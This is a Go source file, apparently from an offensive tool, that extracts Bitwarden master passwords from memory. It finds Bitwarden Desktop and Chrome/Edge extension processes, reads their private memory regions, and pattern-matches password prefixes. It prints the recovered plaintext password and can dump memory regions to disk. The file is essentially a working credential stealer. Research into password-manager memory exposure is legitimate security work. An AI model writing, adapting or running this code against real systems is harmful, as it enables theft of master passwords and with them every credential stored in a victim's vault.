package main

import (
	"bytes"
	"fmt"
	"regexp"
	"strings"
	"syscall"
	"unicode"

	"github.com/0xrawsec/golang-win32/win32"
	"github.com/0xrawsec/golang-win32/win32/kernel32"
	"github.com/shirou/gopsutil/v3/process"
)

// Original font pattern
// f.o.n.t.-.f.a.c.e.
var chromiumExtFontPattern = []byte{0x66, 0x00, 0x6f, 0x00, 0x6e, 0x00, 0x74, 0x00, 0x2d, 0x00, 0x66, 0x00, 0x61, 0x00, 0x63, 0x00, 0x65, 0x00}

// Characters ^T
var bwDesktopPattern = []byte{0x5e, 0x54}

func getFilteredProcs(procList []*process.Process) ([]*targetProcStruct, error) {
	// Create empty slice of struct pointers.
	allFilteredProcesses := []*targetProcStruct{}

	for i := range procList {

		pid := procList[i].Pid
		exeName, _ := procList[i].Name()
		cmdLine, _ := procList[i].Cmdline()

		// Find process with specific exeName and specific child process (cmdLine)
		if exeName == BWDesktopEXEName && strings.Contains(cmdLine, BWDesktopCmdLine) ||
			(exeName == MSEdgeEXEName || exeName == ChromeEXEName) && strings.Contains(cmdLine, BWChromeCmdLine) {
			// Create struct and append it to the slice.
			p := new(targetProcStruct)
			p.pidInt = pid
			p.exeName = exeName
			p.cmdLine = cmdLine
			// Append to emtpy slice
			allFilteredProcesses = append(allFilteredProcesses, p)
		}
	}

	if len(allFilteredProcesses) == 0 {
		return nil, fmt.Errorf("[!] Target process list emtpy!")
	}

	return allFilteredProcesses, nil
}

func searchProcessMemory(pid int, exe string) error {

	// Open the process with appropriate access rights
	da := uint32(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION)
	hProcess, err := syscall.OpenProcess(da, false, uint32(pid))
	if err != nil {
		return err
	}
	defer kernel32.CloseHandle(win32.HANDLE(hProcess))

	fmt.Printf("[+] Searching PID memory (%d)\n", pid)

	for mbi := range kernel32.AllVirtualQueryEx(win32.HANDLE(hProcess)) {
		// Filter by type, state, protection and regionsize
		// Docs: https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information

		if mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE && mbi.Protect == PAGE_READWRITE && mbi.RegionSize <= 0x14000 {
			// Bitwarden Desktop RegionSize: 0x14000
			// Bitwarden Chrome RegionSize: < (1 << 25)
			mem := make([]byte, mbi.RegionSize)
			lpAddress := win32.LPCVOID(mbi.BaseAddress)
			kernel32.ReadProcessMemory(win32.HANDLE(hProcess), lpAddress, mem)

			// Search for magic pattern in each memory region
			if exe == BWDesktopEXEName {
				searchBWDesktopBytePattern(pid, mem, mbi)
			} else {
				searchChromiumBytePattern(pid, mem, mbi)
			}

		}
	}
	return nil
}

func searchBWDesktopBytePattern(pid int, mem []byte, mbi win32.MemoryBasicInformation) {

	// Try find initial Byte pattern in memory region
	if bytes.Contains(mem, bwDesktopPattern) {

		// Open out file
		//if dumpMemoryOption {
		//	writeMemoryRegions(pid, mbi.BaseAddress, mem)
		//}
		r, err := regexp.Compile(BWDesktopRegexBytePattern)
		if err != nil {
			fmt.Printf("[!] Offset not found")
		}

		patternOffsetAddr := r.FindIndex(mem)

		if len(patternOffsetAddr) != 0 {
			fmt.Printf("[+] Found pattern at MemBaseAddr (0x%x)\n", mbi.BaseAddress)

			// Write memory regions to a file
			if dumpMemoryOption {
				writeMemoryRegions(pid, mbi.BaseAddress, mem)
			}

			// Too unreliable
			//r2, err := regexp.Compile(`\x00\x00`)

			// Wworks on win 10 and 11 with latest Bitwarden Desktop but could be improved
			// Search for nulls/non-ASCII character as terminators to try to get len of pass
			r2, err := regexp.Compile(`\x00|([^\x20-\x7E])`)
			if err != nil {
				fmt.Printf("[!] Offset 2 not found")
			}

			passOffset := patternOffsetAddr[0] + 2
			passEndOffset := r2.FindIndex(mem[passOffset:])

			fmt.Printf("[+] Found password prefix bytes at offset (0x%04x)\n", patternOffsetAddr[0])

			// Bitwarden web registeration has a minimum 8 characters
			// for master passwords
			if passEndOffset[0] >= 8 {
				str := bytes.NewBuffer(mem[passOffset : passOffset+passEndOffset[0]]).String()
				//  Filter out non-ASCII characters (sorry for non-english support)
				if isASCII(str) {
					fmt.Printf("[+] Password recovered: %q\n\n", str)
					// Stop searching when found
					syscall.Exit(0)
				} else {
					fmt.Printf("[!] Contains non-ASCII characters, skipping...\n")
				}
			} else {
				fmt.Printf("[!] Invalid offset size, skipping...\n\n")
			}

		} else {
			fmt.Printf("[!] Password not found :(\n\n")
		}

	}
}

func searchChromiumBytePattern(pid int, mem []byte, mbi win32.MemoryBasicInformation) {

	if bytes.Contains(mem, chromiumExtFontPattern) {

		fmt.Printf("[+] Found pattern at MemBaseAddr (0x%x)\n", mbi.BaseAddress)

		// Write memory regions to a file
		if dumpMemoryOption {
			writeMemoryRegions(pid, mbi.BaseAddress, mem)
		}

		// Search for password prefix pattern: 04 00 00 00 ?? 00 00 00 01
		r, err := regexp.Compile(BWChromeRegexBytePattern)
		if err != nil {
			fmt.Printf("[!] Offset not found")
		}

		patternOffsetAddr := r.FindIndex(mem)

		if len(patternOffsetAddr) != 0 {
			// Extract password length and offset
			// Pattern: 04 00 00 00 XX 00 00 00 01
			passLenOffset := patternOffsetAddr[0] + 4
			passOffset := patternOffsetAddr[0] + 12
			passLen := mem[passLenOffset]

			str := bytes.NewBuffer(mem[passOffset : passOffset+int(passLen)]).String()

			fmt.Printf("[+] Found password prefix bytes at offset (0x%04x)\n", patternOffsetAddr[0])
			fmt.Printf("[+] Found password length (0x%02x) or %d characters\n", passLen, passLen)

			// Bitwarden web registeration has a minimum 8 characters
			// for master password and filter out non-ASCII characters
			if passLen >= 8 && isASCII(str) {

				fmt.Printf("[+] Password: %s\n\n", str)
			} else {
				fmt.Printf("[!] Contains non-ASCII characters, skipping...\n\n")
			}

		} else {
			fmt.Printf("[!] Password not found :(\n\n")
		}

	}
}

// Source: https://stackoverflow.com/questions/53069040/checking-a-string-contains-only-ascii-characters
func isASCII(s string) bool {
	for i := 0; i < len(s); i++ {
		if s[i] > unicode.MaxASCII {
			return false
		}
	}
	return true
}
